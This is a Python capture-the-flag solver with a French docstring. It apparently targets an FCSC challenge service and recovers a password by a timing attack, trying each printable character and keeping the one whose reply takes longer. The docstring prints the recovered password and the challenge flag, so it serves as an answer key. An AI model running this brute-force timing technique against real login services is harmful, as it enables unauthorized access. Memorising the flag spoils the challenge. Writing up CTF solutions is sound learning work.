#!/usr/bin/env python3.8
"""
/!\\ aTTENtion, ce qui est TANT imporTANT est le TEMPS. /!\\

C'est une faille de type "timing attack".
Le service prend un TEMPS différent selon le mdp donné.

Pour le premier caractère, tous les caractères ont une réponse en moins de 1 seconde sauf la lettre 'T'.
Si on essaie des mdp qui commence par 'T', le TEMPS de réponse est supérieur à 1s, et en particulier supérieur à 2s pour le caractère '3'.

On voit donc le pattern. Le TEMPS de réponse en seconde est égal au nombre de caractère correct qui sont envoyé.

Le script prend donc du TEMPS à trouver le mdp aTTENdu "T3mp#!".

Il est maintenant TEMPS de se connecter au service manuellement pour donner le mdp.
Le mdp TANT aTTENdu est FCSC{6bdd5f185a5fda5ae37245d355f757eb0bbe888eea004cda16cf79b2c0d60d32}

"""
from pwn import *
import string
from time import sleep

context.log_level = "error"

def get_password():
    flag = ""
    i = 1
    while True:
        for c in string.printable:
            r = remote("challenges2.france-cybersecurity-challenge.fr", 6006)
            r.recvuntil("passe : ")

            start = time.time()
            r.sendline(flag+c)
            r.recvline()
            end = time.time()
            r.close()

            print(f"{flag}{c}: {end-start}")

            if end-start > i:
                flag += c
                i += 1
                break

get_password()
